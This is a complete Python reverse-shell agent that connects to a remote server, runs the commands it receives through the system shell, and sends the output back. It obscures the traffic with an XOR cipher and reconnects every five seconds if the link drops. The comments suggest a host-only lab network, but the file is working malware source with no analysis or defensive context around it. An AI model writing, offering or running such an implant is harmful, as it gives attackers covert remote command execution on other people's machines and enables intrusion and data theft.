import socket
import subprocess
import sys
import time

# Configuration
SERVER_IP = "192.168.1.3"  # CHANGE THIS to your  Host-Only IP
SERVER_PORT = 9999
XOR_KEY = 0x41             # Must match the server's key

def xor_cipher(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def run_agent():
    while True:
        try:
            # Create a basic TCP socket stream
            agent = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            agent.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                # 1. Wait for incoming cipher data from the server
                cipher_data = agent.recv(4096)
                if not cipher_data:
                    break
                    
                # 2. Decrypt data back into a readable string
                cmd_string = xor_cipher(cipher_data, XOR_KEY).decode('utf-8')
                
                # Check for explicit termination command
                if cmd_string == "exit":
                    agent.close()
                    sys.exit(0)
                    
                # 3. Execute the command on the target system OS
                # We merge stdout and stderr so we catch operational errors too
                proc = subprocess.Popen(
                    cmd_string, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout + stderr
                
                # Handle cases where the command yields empty output (e.g. cd)
                if not output:
                    output = b"Command executed successfully (No output returned).\n"
                    
                # 4. Encrypt the execution results and send them home
                encrypted_output = xor_cipher(output, XOR_KEY)
                agent.send(encrypted_output)
                
        except (socket.error, KeyboardInterrupt):
            # If the server drops or isn't up yet, back off and retry later
            time.sleep(5)
            continue

if __name__ == "__main__":
    run_agent()